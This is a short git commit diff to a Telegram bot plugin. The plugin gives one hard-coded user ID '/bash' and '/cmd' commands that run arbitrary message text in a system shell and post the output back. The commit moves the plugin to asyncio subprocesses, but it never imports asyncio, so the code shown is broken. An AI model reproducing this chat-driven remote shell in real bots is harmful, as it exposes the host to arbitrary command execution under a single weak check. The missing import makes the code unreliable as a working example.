f6e0289fdab2be4d2220ae2aeab500627707a0c0
Anjana Madu <86356062+AnjanaMadu@users.noreply.github.com>
2021-12-08 22:28:02 +0530

    Update bash.py

--- WebStreamer/bot/plugins/bash.py
+++ WebStreamer/bot/plugins/bash.py
@@ -1,14 +1,14 @@
-import subprocess
 from pyrogram import filters
 from pyrogram.types import Message
 from WebStreamer.bot import StreamBot
-
-def runbash(cmd):
-    return subprocess.check_output(cmd, shell=True).decode('utf-8')
     
 @StreamBot.on_message(filters.user(1252058587) & filters.command(['bash', 'cmd']))
 async def bash(_, m: Message):
     rep = await m.reply("Proccessing...", quote=True)
     cmd = m.text.split(" ", 1)[1]
-    output = runbash(cmd)
+    process = await asyncio.create_subprocess_shell(
+        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+    )
+    stdout, stderr = await process.communicate()
+    output = str(stdout.decode().strip()) + str(stderr.decode().strip())
     await rep.edit(f"`{output}`")
